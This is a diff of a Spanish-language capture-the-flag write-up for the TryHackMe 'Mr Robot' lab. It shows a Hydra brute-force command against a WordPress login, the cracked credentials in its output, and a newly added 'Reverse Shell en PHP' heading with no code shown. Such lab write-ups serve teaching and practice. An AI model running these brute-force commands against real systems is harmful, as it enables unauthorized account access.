@@ -125,7 +125,7 @@
       <ul>
         <li><a href="#enumeration">Enumeración</a></li>
         <li><a href="#bf">Brute Force con Hydra</a></li>
-        <li><a href="#shellcode">Shellcode Analisis</a></li>
+        <li><a href="#rshell">Reverse Shell en PHP</a></li>
         <li><a href="#shell-puck">Shell - puck</a></li>
         <li><a href="#shell-anansi">Shell - anansi</a></li>
         <li><a href="#shell-root">Shell - root</a></li>
@@ -215,13 +215,19 @@ realizar un ataque de fuerza bruta haciendo que vaya descartando nombres de usua
 <p class="plain-text">Vemos que el usuario <code class="language-plaintext highlighter-rouge">Elliot</code> ha sido verificado, a continuación vamos a probarlo en el login.</p>
 <a href="/thm/mrrobot/8.png" target="_blank"><div><p><img src="/thm/mrrobot/8.png"></p></div></a>
 <p class="plain-text">Vaya, parece que efectivamente el usuario existe y podemos ver que el mensaje de error esta vez es diferente. A continuación vamos a volver a lanzar el comando <code class="language-plaintext highlighter-rouge">Hydra</code>pero adaptándolo al nuevo usuario y al nuevo mensaje.</p>
-<code><span class="ve">> sudo hydra </span><span class="am">-l Elliot -P /root/fsocity.dic 10.10.0.164 </span><span class="az">http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered </span>-t 30</span>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"></pre>
+<code><span class="ve">> sudo hydra </span><span class="am">-l Elliot -P /root/fsocity.dic 10.10.0.164 </span><span class="az">http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered </span>-t 30</span><
 <span class="plain-text">[DATA] attacking http-post-form://10.10.0.164:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username</span>
-<span class="plain-text">[<span class="ve">80</span>][<span class="ve">http-post-form</span>] host: <span class="ve">10.10.0.164</span>  login: <span class="ve">Elliot</span>  password: <span class="ve">ER28-0652</span></span>
+<span class="plain-text">[<span class="ve">80</span>][<span class="ve">http-post-form</span>] host: <span class="ve">10.10.0.164</span>  login: <span class="ve">Elliot</span>  password: <span class="ve">ER28-0652</span></span></code>
 </code></pre></div></div><br>
 
 <p class="plain-text">Vamos a probar las credenciales <code class="language-plaintext highlighter-rouge">Elliot:ER28-0652</code> en el login y accederemos al panel de control Wordpress de la página web.</p>
 <a href="/thm/mrrobot/9.png" target="_blank"><div><p><img src="/thm/mrrobot/9.png"></p></div></a>
+
+<section class="post" id="rshell">
+<br><h3 class="post-title">Reverse Shell en PHP</h3><br>
+
+
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">/* WARNING: Removing unreachable block (ram,0x311716c5) */
 
